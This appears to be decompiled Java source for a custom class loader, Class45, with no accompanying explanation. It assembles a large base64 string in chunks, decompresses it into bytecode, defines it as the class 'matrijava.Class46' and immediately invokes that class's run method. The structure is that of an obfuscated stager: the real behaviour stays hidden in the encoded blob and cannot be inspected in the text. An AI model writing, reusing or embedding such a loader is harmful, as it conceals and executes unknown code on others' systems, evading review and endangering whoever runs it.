import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.InflaterInputStream;
import javax.xml.bind.DatatypeConverter;
import matrijava.Class45;

public class Class45 extends ClassLoader {
  public Class45(ClassLoader paramClassLoader) {
    super(paramClassLoader);
  }
  
  public Class<?> loadClass(String paramString, byte[] paramArrayOfbyte) throws ClassNotFoundException {
    return defineClass(paramString, paramArrayOfbyte, 0, paramArrayOfbyte.length);
  }
  
  public static void run() throws Exception {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("eNqNele4/NpVn4597f/h8qfZNNO7770y1qhL2BhmNCNpRhr1kTQyCVGXZtS7lEIqIYVUUklIQgohFRJiOxhIb6TXh7zlLW+85YkUnXsu9jW+fF9mvtFP2tp77aW11l57Lc36xf/zs78AAAAG/NdXAQWIXwU4IHkBpK8C7wZuj8D9CbNHIH8E");
    stringBuilder.append("ikegfASqR6B+BJpHoH0EukegfwSGR2B8BKZHYH4ElkfgNz4Cv+kR+M2PwG95BH7gEfitj8BvewR++yPwOx6B3/kI/K5H4Acfgd/9CPzQI/B7HoHf+wj8vkfg9z8CP/wI/IFH4A8+An/oEfjDj8AfeQT+6CPwI4/AH3sE/vgj8CcegT/5CPyp");
    stringBuilder.append("R+BPPwI/+gj8mUfgzz4CP/bE2p974vfPvwr8BeDHXwX+IvCXXgB/+QXwV14FPgb8xKvAdwN/9QXwk68CW+D21O2vPZ399VeBvwH8zafLv/UC+NtPj/xTTxdvPvdPPwIffwH8nVcBEfi7L4CfeRX4e8AnXgCffADe+9G0SLuPPQBf85p4cwcX");
    stringBuilder.append("ytwihpjMbVuxdIOw+cjr5gPwClMG4QPwJWJahFKfe2FjuF62tnxBtnZ6s/cD8MG3U9C7Ji3ij3x89/qvJvuRB+DVw+SHVZeWRfsC+NRKRU/jwu36ZqX4xv8flY++8bGV0LubvliPr71uvgD+/spmlVYriQ+/RSItoWNR9d1KJXTzj3ymUe67");
    stringBuilder.append("z7Y+Pd4X6Z3r389u9eZTvQB+9gF4T18sabXK57V18o/v3vnpPr/lidqretk3fsimTwJ6+Sa3GPHhp64vARXQXgKfBn7uAfiqXz1216fZKu+nPt/3APxMKNVSeCkuBJ1M6ICaogdHxga04FNZWPiRDwz/ftXVbZ3Dp93hoO4O2+3uwGwTebzn");
    stringBuilder.append("6/W0n4p2f8bL5UyU07nwVY/nXPNw0TurzDbW7N/7HpznmSLI5jTuIGjwLveuLjRlPuxotRfD2svsyexgAwJtCFIcdLvdHkDFMdqth1ygHUtJlwKTwyhOoq1Iz/uXwM8Dv7DyjkLhdoCoEDqyJCaNe3rCMZpioB11oBmZ3gVbKA1RBt9Rd7qX");
    stringBuilder.append("iD29I33yziJ76ERepHlPJfiFJhhwR21o96n/CBHhsvdj6BAaShTvaWKvoKoCDVsaZBQU20XDqENBvKw3IPKqRLcbDe4U5Xyj7iMoQMrJoIRoW6CYAMUL1m6g9bxloGEy4uMpCtVSXdmmdmEYixAWsB7BTgQHuRbfkxDFKqNJsX7EFxDMREmz");
    stringBuilder.append("RwacGCllmaKNBBI7aGtQixvFM7gbFJWFwLnApGiHFiUDhWMUUp5sk9KJIlScIrlL5Rslb1SbNu7C6kIHOjkkOzooGzyBMd9ByVGDsRtqnLZNTvcXNpM5jFjl4SylHN5IbF+gm2VHIpWYFZuVbSQLHRMlVNLqUEzOcuoopH2oOZBqUGA7scNG");
    stringBuilder.append("dzakYS4Kb0IL1a9iqzPE4URY66SMjqLWpLYDGTacMwnW1bLRdD/pFh/AhSbdZHsUc5rOkHRz86JyFR5JwwSG3uzBPFM2fTEoZZW+NHieWF5aFA6L0oQyu2jgaDPiV967LPAgzFAsxhQXDo5vYSKxsj22iupgWzZHopjH9lG/PUdQy+EG350c");
    stringBuilder.append("tIVuLN+Pe5/pHXUP3VwtOM5h1uwkSfdvsA47NV43KnEv7Xog9SNxneR46k062GORWTWenUyVV6nBhOTxdIUVT9d5ETSDRioW6VLZgiblWnrZcM3lmFRmkJcMWBs1MunwLh9r8XDUMgfLCu6e5AduSe7jsGVWtmOd7Sd3Tve1Z58TZZeMg7Q7");
    stringBuilder.append("1V4LwS6RWZfhCneCdT5XIcc74DaKC2pDbDBtOe9VxbZCwku5AuLCik76vsWgdKRu8zWweAcfrjZlqoMyh2lVCEevFi4Cx3En1ivmI6Fls4ZswiIJc1KzLfUKI3SbbBehUf3rEdLlC3zbJfPpnh7Ce08mkD+WuF4maiCtbFf3w7nA8E7rKc+V");
    stringBuilder.append("ED/ZbfsMY1N2KvxWKVQ6vOpOkSITEY9UHOqEXYZ5Z4Y2v2fyVig31hakDj5B7KyjlEq6YDBIzxBxPMWXibCGA8KfxT3KlHzPoxk95tnNoZl8qFrZyjl11uLrIdUibqh3l8EkEfnAYmh7NIlCELAtGXK9xDDhpkdIibqZoh7yvLeyHZknh9o1");
    stringBuilder.append("EWJjBpnS4EUXNfXojOkWUxuuAWtGqyz3PLEsccCk3c4TKmV2Pe+gb0ANotATZ6FKbLppyjVSI5gnA57zXEbdNOc1K9GaVtBKmLKtC5rZx8gm5Zwzlj64HaRu1I6cwwfUjbPupHfhyGKLKpwpb2eUJHlBKX1h1vT2QsLXhtaWLS9hw9mqspVt");
    stringBuilder.append("7N4fD4WNp4wVnOktngXntpL7XqxgQ7Pac+RrTovdNHRPDCXhaefZb+zr/XyfCfXaelLStUgemPI+YRRepY83OSZ6nOGXXhsi++xkjgTS5XBGnTnbVgfyQOORwyuHqb3gvLc/LnZt0XPcBJdr4cq5cb7FmHVv9k5y0m1csdEeu4qwHnXTgeqh");
    stringBuilder.append("08lF0tvKtuSf3MgiD+rqZ0bJohi/F4bzXkJKKrvfVdkphIpy8WiTtNj93oB7scA3oTmK6p1BpW5H34j6fDRQXSdgnlZBO1NhhshdoT3PCl6L/q0cUEl2/HuQnJh2sxqRjt1OFa9J4HaD8lGZrOtXnQKrazIniutEcPeVcNufeLtyXNkUr4nM");
    stringBuilder.append("VKNOtUYoitXqSoSnrZJTBmTYMOlk1tNoeo6pdElrnUYhr82+vFX61CjuvNzXVUR1lZKn15K3iY3kRhly9mKwiBsYzlq+VqbujOB6J+VdFOSThoq2rx2ltitwDJ5Z++i3NYmbbU2gIVwSlkkEZ6s58Mp4kq+kq02BGdjnnJmVfMMJvHYFQ8Pr");
    stringBuilder.append("jK2EHOtkXxzMKSRwxvOyJ9v2Ls5NwKpOk0e4Ukn5wARzo7oZB8kC3wlZl/LKpcOSS1GTlXUZ29rmuyxf3GxHGtDe82zt1LRxyUeDK6JSe61OuTfW6hCD2kiMSJyLGFR4GljHNsMM1/CC3kEm6uKKyNwzjAogMhtO26PeEQ3N0m/YcyLdTkg8");
    stringBuilder.append("VzV6069Rpvlwk687SWVizvmC9/XxyUicrMfpLqdY5p5eskvHe767GpndXQjEsG8u4w9rJDXShLjzjkjjXQNhMFsYnhxUY+nCO9gOvTT6dZvJ+7aVWk2X5UNTj23hSlYZ283eSFx21YCSXrrOnoy7y7Dazc0Unu6duuF7CjvJvhJpZYzp/ClZ");
    stringBuilder.append("7A1ro7N1xQ/+tZRkPL9a08Y9F7N1rM94f+Oe/DY8R0ZzwgIl8e5hNd+PjYN70/HsQBWWd92m8rhNKS21eWZFb3c6y8m9Qxm1psou8k55oW9m0ldVGGXLCm3nbrdt702MZcdNyN6C4oLL9i5urS5UXZaIwcVqbo2II3pH224s4Phh0Itsc9s0");
    stringBuilder.append("KpIyCSwHaZiATCkwF65rxXsr1DTIVrBOiBrN3VxCxI2V7UXA57wwTOSuB20uE7Y+nlzen7NOrUk9oH1nOZ493qn27nBC2EvFoGZ/rG0VTK5p6GgKAW84DBGxyvNP/fV6PjjZWAl9q/thvlSBLpdaAGlcXmwtv23ZG0HGg9jSEGPeFri8C0TH");
    stringBuilder.append("OAw7wxdbd5gSPxvbcJRw8zL5E0sqjVhRNTF5nQpRvhDqEzNqTzFJKaKd0uR+wNR0aXapRhu8JObJGumZIuwlWN7jh+1YY1Sy1wRz5pmDqyVzOzCn43LBSplAc+OwIPE1PHIyFez7JKYawqnuWMgRpgc2x0Iz6lo6wZcU7qF6KaxmyJr07qlG");
    stringBuilder.append("aFyscGNNqGtGSe9tBzkbroplS/K68yyOtmcyDy9Y3eZPVeERN08o6TrlV7b3oCnQbA73yH6izOWSb1zI5brE6utQ7Dx1daE5StvzYAvbPJHJDdxQF26NC/kjhd3hymvmeWCPHI6Nop+IAZ5X3D5V9PR0NN1lg7SnHtybapUbvoYhQq/4lVPO");
    stringBuilder.append("wUQiLH4Mc5EOUtkxDy0/1gaYadOUeVcTvlWV0oNFqvkIfany/m5T83w1+PM5adxlZVs/l3EP207ZyiFSKMc+cGIX26QmZzf9nROCmN5lhWdomRHfYLguAiPGBIU1fegcSnpddu5Ru7gcgtyPLE8VxzJQ9URjj3OzwythcRx/ddE0S/nZxYDQ");
    stringBuilder.append("+3UQJa4+iUHhMIeat5I1J3SZ1lruB2NmYvTGZl1GCnSz7/LSigUouJyrbmdJeRNPNB+H9+5pSUqit9kYm7ySzkvnNQ52xW794uUn1+559tDWzCy6Lo2h3GFkaqvWlWYhu4PM3Gv5Itx79b5ENnpOcCLb6Qy06sFN+nBaQqW37ve+seXGajzx");
    stringBuilder.append("eID9MFSDHcmicocI4JmtroJr6H1fGXcuo61VGDA7ZQol19iChwqlI+tuTOQ1q4fwGHPIZtbu8lbi0adQqsDopcyUPL8jkxm3m2KaLOTas8R8xAiYXmZHk/ceGR49snLIyXOG3EcYxVB85rqZPfxwIiVFp1lmTxKs7Zx2HmfJu9PQwlPC0plv");
    stringBuilder.append("zHtePMHZIV92a+jNLKCh7j2qz/MiFFt3O2nzopYYfM5SNlAY3qhHCoLrW+/b1j07nPabQ3o4C5uLDMMnJxaX/ZvZjaULV0+fnWXnJq2tNhnfFKIye/m8MnxNLBPPl70MWXYDS+d1G7XlMJVuQz/PnXU59TfJPOEhkmW+r+Z6q8K7+90TgyxK");
    stringBuilder.append("Zgw6BuHtpMWI27l51p+8dYd3N1BRYqdJ04UaE4zhZt3kjVdbY79zUQTSNzBtSBtH1yEtL4LCTMojfgEjm+m3xIJUTX8h+qd4e+E6kfGnjVGy8twxoKiYOZOw2MYR4B1lV6J5LyG1ME0MQROfQoIxHhN6LycnrKjMKhHsvNJVNoPDLBX3Vn+U");
    stringBuilder.append("2abBK+x6wrR4vlipNxf0RtzdM8HVXRfjq8SS9aNznNFbTd2FqqE6o29Xn7TKx+7Nmm7JRrvGmawQVJNKF/vESC0GG2O3tKvHEzvWWdkmI9nxZJ263tYMil3zZyOpWBi/eYkdIVdJULvW0LDW17qcCLtkPpBtcmHnpso0tkHbyB6rNar0OxbZ");
    stringBuilder.append("Wm3GECpy6Rh/lMVJEqh0U6CHcjWmdUUt6O1EcgsyqeOmsZNQwJC7PCSxW+cObRnkoUjN4L7qJ9sEU3ZZE0OGP3VWF9jXzhoj1RRPg99ciz3prmyn6Fk3Y9rx26zckJdKc3WxxDc4SBbjptLa+02mGz+/k8jsBP3c5epQ3E7DfbNBg7ogT8a9");
    stringBuilder.append("otEE4+beRcFJXbKZNM+BBmabJDPyGVaRguT5IwyaTk9ZjOChDuucrhQJhwdWj5Jr2B8w0D3LBoe35rHEg63eYlK20ey7ZKu95fKKX1O9afQp66JkO9/7le1mSy5nVTQSatIwbnXXRHqEu0HWQ/t4CPuUU7pbr42GOJ2vxZEqUSnDt5Y3lt6a");
    stringBuilder.append("HnV5lrHWIsCh2sjZkVT4/uzMclPMYX33QlBa8nhX7EQPCSBHrLv9eGm9uDJXD+PZFhmreL85mJvVehtDu0cGLo/9QWyYJJDlUfc6nCawTg74mK53J1u8I/op5MSnUAps8H3jbgoxktZYtubqY0PqEkXxOyWHPN+2pYSvMzVWFF+vHdMoYH/q");
    stringBuilder.append("m0nb9hReNtvjGW98We6lEucDjtFkYuqN+gjPhFWepF1FSv7ewO+uG1Wisg1Dw7JOzOK68y4+QBns8FcmouW6XpNMiQ1pFIHLmxQ01JTx7d1qzFNvii7LabByjcVjySGZbYYr2/ztclDNqDskDdw2trHFZLx0JUOq8uASLVTL0UoeG822ZaMF");
    stringBuilder.append("vJ5sBBMKBLIy3HT8WbwbxDQhOt0aJq9yoKYWd73SvRLNeJZ209JTIiFsqLnYhxrXace+u3lyE/noeUMoO1Lab+SlxaoxbpDkUKcTKg4FOvrVhbmsUZRwccLuFAa5F4W8MhdnqNh76NN202/upD7iCcl0CHdqb8lMm0V4W6Z9MTQNC1cyHItb");
    stringBuilder.append("NECOyIK0RiJJ67qz3F1hyuaBvZCkpeMpFwVnzjmBdcIs9zCzLwqP7+M4aYjFWEJocxHWKEO9HAvuSsKUyUyedRByVHVwOdzjGGa6JC6gYo7h+T6MLhLeXntwCrQmTnb0EKjYKRErgbnpFbimjfWTJwnNJbjam8sRP2/sMZ9B92bae4ZiYcKf");
    stringBuilder.append("T24m9fG1hZotMSW26152yxolkxcPwm+2AAdKL/ECe9SuR6GXRsLw5EtnEmbcL3W6tZmOXZgbK8sg3dXB/aiSOe4uN2JRz5aBRdFNK8TNNZHgaDtr5C734dPSBFjr8jWbXbIgjuzlaMulJRPwEtIi7t3CYPvENoeeNp6kwH1DaUmHymoUkP1m");
    stringBuilder.append("VjW2ShGO2AmVavGCnQ6C2ZLiapamllWdcSxdt2WhtKWLlOAUIfWEwTte3DNq50YPuXkcQ02UR/6VU9FLNITCxUNmjr5W+6bcNoXjn5UjUUdLGIiJ7wcbc06yoAmk6UKRGubImTwR+S06rBqYL/fF7eUBZivpdvX8p8099xkEJiaKzZr9/dSy");
    stringBuilder.append("ZjbwqZeezSPP7TaH6CL3x01bJgLXHfLkiMInGBs5gjdOiNx2nqujZCk0qd+vIdDFx06kedVxNI0Vwda7Cj1NncPpOy6TWUkneA7xccHQmCKO9K23yUS/rIM9ZkL2vjfE3Q0+Ulk9Y9npcsQMpdXgzHDqW+CEW2SDMrSd3HYm9ZQm1GfYEU+u");
    stringBuilder.append("Y0QRq5rYadgPhQdKiHDFPTg4dPl4v1xMek1m1rQAg3N2I+r7wN87ZXZP+GLS5WEND09HveJ8D+0Nz50cTyN7MiRVr6XIGJ7WdBv2j5RSJLGJ2G21U+PqpjsYGyBj0N/9+kZrkh/pY4ug/EVOUbrkMq8fQOcM8l62jiU1omqsuT8hQU3a/pMD");
    stringBuilder.append("9MaU7LyRbZDM6M9Ljs5rytiuTEh3WRxOp340TpuoZq9wOC5sGiNEieWedrmtsbTQiETQqbddhYkJnIHZdQNvrJ17n+fjEackt6UDRZhLRzlgsL5HYhC9XrRxDcpCsJDgpJGSScX4e7PJklPfU5kU+9q0NEcF185wSuzdciPvdSsIjEHgBCwR");
    stringBuilder.append("pfJ6PDy9lUr3twS9BhQ9y3qr3TFQoOtc1WR772+unBsWw+rMV8fMnfum1HVbOfdXOBpt+ZxvHZuT7gVPRMR8yEJuIJEYz8SqOV5uyGWk0K0KlgXL0DsKGVnYLwROMvsd04AcebtyDTjy0WTgKWt0waxzdwaNigNVln3CXY8kFtwqoebNajf1");
    stringBuilder.append("azo3XVDZ5mapwbGV7UsMhzbqlUR5XNKxz9w1mKACQZiwNZ3Fx5SqF8Nyg/laHzq8UhKHWRBIrueOVjv71IRmTuqe0Aj3+k67Lrxk54KHaXzaa6IpKcTB9hCkOtL3iCJgQqwv/KasklL2DjRMbqQySUxVGvuWpQN1xOL7js6ikW6nqPKYbIum");
    stringBuilder.append("DR073Fmv2YU/wJvIUGnv9vQyDZmLbDkGTeRGtz5xjdznj6eJwPmCYVxw3x5ucVGlBsI0/t0j6vPYumA5C82I5AhBbtPUYs37jUXcOUgS6cygu9HTt/iklo51NIkmb1WdDEjJ9WOs5rjzYe4x8or2R++uXKabdkDVtHJmfofVsoPa6ZmcSUex");
    stringBuilder.append("wAuFWQ03W5stIcOMhdzTlAhQdmDTTFnZHiojvzO3E7U9zOgp55V0jYUPgzrmZXKvhGQJ8HAjz0dx5oKWns9HAit66LxvMILz3X68mrvhiHA4sXHBKyEYIq3w0hqtu7tG3ksEz06EPIphprno4aqhUmdWNne3ZAMlVCHmyTtz2TeosRRhX/H2");
    stringBuilder.append("Qax2Q+CNWECyOONce725jfalmy/yPEKlflwWNcyfNvdz2EIHhzjsjK6ddCulJGyDzsx5QwlM3oPmaZuFeKEw+xN5WMbZkqPLcMjyNg5xQtxade2Os2K35zFl6o0eE4cYg93RFewZRmjoENwRvj1PMGpteitN1zSxhbvZS3GL3CN5vS0ql/fc");
    stringBuilder.append("INsv9mkOHUv0sJNs3qr8qsvsJrNuR2w4sEdb931YnwmbdQ9Ptr2UJVbFI6uqk9Bkl7udEbVdXMhrGYU1azGt2uuzuVWu94nYTLi1pjGs29Tbi0HnaCRTeXyRQjX2+XRHCCFkbsONLayJ7ObSeAnRG0nkW4Mo1uIgVsbFaTFIEmoBJ80Lzp3K");
    stringBuilder.append("XWxz21gq7b14b+g7xqUzaLXSvZUk1Oq1atUPJK650SmRMsphRVNXHMt6Clxv450v1qAzyFTE2AUsgdSMSWTb6ZIlOBMf8SzkRXfBnPt4lNxAr+lxyBBSFKee29928klmWAprF0y1kWWnSZJqhpSsHAO0zXVrmosScljhSBjMsbkmAXe8b0aI");
    stringBuilder.append("oY05bmC6M67+jO12/rJxL1EpIJbGeFLAsttmIi9JPTTW/WDXmJeb1sY9H2OcVrmn1zvKcBEWebs0eJrn1yl0jLu4EGEsBXPEkkx+11S29TeHo6bf5GCRRy1NbU+Wh2yCLSg80NNMxUSaDVRUkDp0sJ1UOFpXsDrFPFcKtrCdDF5dVi8NV5Na");
    stringBuilder.append("c0Jth4LJi+bkT2l+vCGxza/5IHw77c4BESFSqoltt/WWgykN140Qkop739KGgBJbzMEKsHozJsFvzLVS3fHOcM35WNEEr2sydCE2ehfsZVaYSUW8XrZXCzkqx7sSR1esBadYlCb8cBEUN9dNjnTdsLpIvu3isq+aittALZHZtUpoU41v/SKC");
    stringBuilder.append("Q3OyEBLcShPvNlcxCoLAj9mNb5pklDfMuhnA5syk+JoI0cPWlU+b03i3DMmFS3037pEGxQ72BtlGaMmjT3+nOjMeFktJ20vSatJBGRWIU2bD2Ww5OFHGnIK2ymhBtGpQLRLFBSZBvuqDkDdW8N612RPW77xFHG93addZXp8lKLaTIZhy0il1");
    stringBuilder.append("rqZzWYa+gFUoKu0F96HuEoCyquztacHA1pG3+46LbjbGdcoohVFsU3uo3yz+1sjzxeJQMAkUVYm2CtRz4X5HxgT1JO0xIvwztJUovglAhkbn87qWTtiiKWNjRTGKKdEQn6Po3CPYyhG8hVTcWxLq5i0D3XrDVhkgmlAlmI/ojpFD3I+Sk9+G");
    stringBuilder.append("ggKD58qTYhjtyaBWGnIvXMuYAqEtTtPpJh30G3IT13mGHJq1YOuDlHJU9ujS0ZBBQ41347f3ZZHFEOp2p4JBsdgLapUihqeYBMrVQzDvTjMFmfREXSnhzKNFE/TevkZ9GLTDQB47ArTzgmqyZIemWGWfmZmfr4FWr4F/hx8okCi5MvQUEBzr");
    stringBuilder.append("oo55vo4Z/aqDzoUCR2VwLjg/JPRxW7qRO3uY4tDQMJQzAVHpkZx4+1Yo3CWS+AO42lfjgZbHQ6KYo5mpOjf5qKqQX92cKNT4wenppz9B/JyA9o3nRVl+vlITyMMpmjI01Z7vFFeMmrfl9jiNxmLPsz1M4aFbLBiDLgHogGmzkZsbCRYTuiO9");
    stringBuilder.append("hQ6zhWiGHUJxyuIY+BqghSGnUAgYkmCErJ2DNS2e0CEuQrqxh6Uo4v151buxi2x8GTR9LwUItQ+hvRzqnYo3vTPSMFQUhzCAop2Hne2lBvcr2yxl2jbakBJ1IBs2iMLheKQxaFzuAQbGtyEsteIG7XsNWrdP9KYcyQU9BCTKMNTqCdsIU2WF");
    stringBuilder.append("OrM8KG1vkRKvKj8eeRQ53BaUmSYoOay05kuEUesvXX8wI1FgcgCpMYZANV7XTAxB648a0yi66jYPcuY6D7w1CcYZbn5HrdkhGG7RcTssdITG6DCubG+jbUgd+LF88l/RLqFYJT6OW4YfL1dwl1zjElw38p2yyGdI1gZsAkN67bhdMEnZWjQS");
    stringBuilder.append("LAJZxyrEXB18SkGmGF1oz2MctG0wUbmZeQgOsRnkUA0yKF7ikQpT+2aUlRgEtyS2hRJ5O9oUyyjJsN3aUOR4ozJuZSj141EGt7soieKtAXHwDhVHkSAzNH7z9Y4fbQWahmm+JuUdXqHwhuIXFBtGFpOVIZx4KoEGusYh8jTcGPDSQ/sOozVq");
    stringBuilder.append("anUlRiEQGiIFxu392FKEXago3d+qzbDg/JLZmbaXdsV8U8auo1gSjZmbtCIJkcqdX3YDwR1lQrKU5dyN7AzdnO1CgKuc9vZWx2lu2i0OgyIbbtL9xFEineZ40JoegB9qiUXyDkkvdQsCkjdFCFuJrEOHprtCE3bDdg0hr2IBScMtBc0h7oJo");
    stringBuilder.append("t1B1FMG3y4Ki03QFQVASbHtIFew8RDsWxHOUhw1/d0VRJUlwUmGRq50251sVZA5IF1uqGu7ratf5dDWjgi7v0jQ/AF+Wu12TPpXufPi5sId8CfwD4B++BD4OBC+Af/QS+MfAP3kB/NOXwD8D/vkD8M1v1vj0XZpBS1pBxyLK3C5s3laU9AB8");
    stringBuilder.append("3a9UJe3mLtw2jTu/7fZTMdC/eDr8ywfg6z+v49vrmF4Cvx74/pfAvwJ+8QXwr18C/wb4ty8BD/DfzjH0VinSS+DfAf/+JXABzAfgS35VWdVL4D8A//EB+NLPNstrRu93L4D/9BL4z8B/eQC+4h2rxB6Ab/pV7VLZsWVfBJ8p9XoA3v/ZLm9r");
    stringBuilder.append("fddTddUXBmGUFuFblWSvv2MN2PH4TrVk73WrKiyCB+A732HQ6+KvUWW1DnzsyuemB+DLX/v8jh/5FX4/t4rsAXhlhXW69zwVhh3Xse9UVbbeHpu0Cx+AF6+9ybj51oAVv/qdq9Oebn1hV35GuetEr71ZePamYCdoyjPIS4sA2rud281VyJTF");
    stringBuilder.append("EDbdk+y/rHKbNty5bUhgu7Rwm3X0V76TOJ7ofXkcdvrcdmH+Ofr7wGuv/xoFgA/AF6xDzmGXlOtzf+876ebz9PJ2Wk0YZasJQc8UVnJf/WvdW7WZFkN5X+VGv32aZxv8nGneanr985uAbwY4QAGePu8FHp4q7tajvl59C/Cu9bu2vgF+Enj4");
    stringBuilder.append("6fXsATDW46tvtn4R8B7gi9eWdVkA736r/3vWs/X+G+CH3v2hX/gE8K6f+syYJ8oA8KWAtR5fWc9t4LqevQtwgC9YXcH3rWcrhXfZK679HqpPA+++fhJ4RXjjfe/5BPBe6433vXiGx2f4gmd49Rm+8BlePsMXPcMXP8OXPMOXPsOXPcP7nuH9");
    stringBuilder.append("z/Dlz/AVz/CVz/BVz/DVz/CBZ/iaZ/jaZ/i6Z/j6Z/iGZ/jGZ/imZ/jmZ/iWZ/jWZ/i2Z/j2Z/iOZ/jgM7z2DK8/wxvPAD7Dh57hO5/hw88APcPmGeBnQJ4BfQbsGfBnIJ6BfIL3UesM9KeA7/qsbv8bgK/H9wOPwJcDXwJ8BfCV6/frga8C");
    stringBuilder.append("vg34agAEPgAgwNcANPC1wPcCX7dazdcDEvANqwV846rBbwL81ZJuqxXUwLcC0zriB4BvB34Q+A7gh4EPAj8CvAb8KPA68OPAG8BPrpR+CvgQ8EngO4FfAD68un5o9b+b1V3CwH9fZ/gfAAr8TwADfmnl5X8BBPC/AfLhFYB6+EKAfngf8F0P");
    stringBuilder.append("HwA+8vBNwEcfPgh898OHgY894MD3PHwU+N4HBtg+nIDdgwowDzawf/h+4PAQAdxDCfCfsbtft9rb6vif7W219VfWLwB87Ze9Avzc4/mNVcQfuX7sx4AvWg141etHf+L//tJPv2mmT6J535tdT6spi6shn1dByMBvWFteAu/6ZeC9LwD3l4H3");
    stringBuilder.append("P3zOROt+8tZE7FtL41s+DXz39dPAx65vfBL4nk8C3yt+Gtiuhr47gx/6FMCs0+8/u2Se51PXubRV+PoqbONzqK876FvU7ZX2e1bcgJ8CDp8C2POnAe76KYD/JHCUvvPpoU7f9coHXnmf8O6fB8RPAOeHFaVPALL1WbV/5ZvjrVXt9qr866pg");
    stringBuilder.append("Z1XKx9823wMQvimJ6P8BiIBobQ==");
    run("matrijava.Class46", stringBuilder.toString());
  }
  
  public static void pipe(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
    byte[] arrayOfByte = new byte[1024];
    int i;
    while ((i = paramInputStream.read(arrayOfByte)) > 0)
      paramOutputStream.write(arrayOfByte, 0, i); 
  }
  
  public static byte[] unzip(byte[] paramArrayOfbyte) throws Exception {
    InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(paramArrayOfbyte));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    pipe(inflaterInputStream, byteArrayOutputStream);
    return byteArrayOutputStream.toByteArray();
  }
  
  public static void run(String paramString1, String paramString2) throws Exception {
    byte[] arrayOfByte = unzip(DatatypeConverter.parseBase64Binary(paramString2));
    Class45 class45 = new Class45(ClassLoader.getSystemClassLoader());
    Class<?> clazz = class45.loadClass(paramString1, arrayOfByte);
    clazz.getMethod("run", new Class[0]).invoke(null, new Object[0]);
  }
}
